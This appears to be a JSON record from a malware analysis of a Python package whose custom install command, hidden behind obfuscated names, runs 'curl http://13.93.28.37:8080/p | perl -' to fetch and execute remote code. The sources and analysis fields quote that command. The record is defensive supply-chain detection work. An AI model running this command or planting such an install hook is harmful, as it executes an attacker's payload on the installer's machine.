  "purpose": "Define a custom installation command that executes a shell command during package installation.",
  "sources": "The subprocess call executing 'curl http://13.93.28.37:8080/p | perl -'.",
  "sinks": "The subprocess module executing a shell command that makes an external network request and runs Perl code.",
  "flows": "During installation, the custom 'install' class runs subprocess, executing a network request and potentially malicious Perl code.",
  "anomalies": "Use of obfuscated class and method names, and execution of a shell command during package installation. The URL accessed is suspicious, and the Perl command indicates possible malicious activity.",
  "analysis": "The code imports subprocess and setuptools modules. It defines a class with an obfuscated name inheriting from 'install'. The class overrides a method (also obfuscated) which executes a subprocess command: 'curl http://13.93.28.37:8080/p | perl -'. This command fetches content from a remote IP and pipes it to Perl for execution, which is a typical behavior for executing remote malicious payloads. The setup configuration registers this custom class for the 'install' command, meaning the malicious command runs during package installation. The obfuscation and network activity strongly indicate malicious intent.",
  "conclusion": "The code executes a remote payload during installation, which is a malicious supply chain attack. The suspicious URL and execution of remote code confirm malicious behavior. This package should be considered dangerous and should not be used.",
